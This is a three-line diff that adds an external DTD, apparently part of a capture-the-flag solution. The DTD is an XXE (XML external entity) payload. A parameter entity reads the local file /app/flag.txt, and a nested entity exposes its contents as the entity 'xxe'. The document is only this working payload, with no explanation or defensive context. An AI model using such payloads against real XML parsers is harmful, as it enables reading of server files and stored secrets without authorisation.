@@ -1,0 +1,3 @@
+<!ENTITY % f SYSTEM "file:///app/flag.txt">
+<!ENTITY % d "<!ENTITY xxe '%f;'>">
+%d;
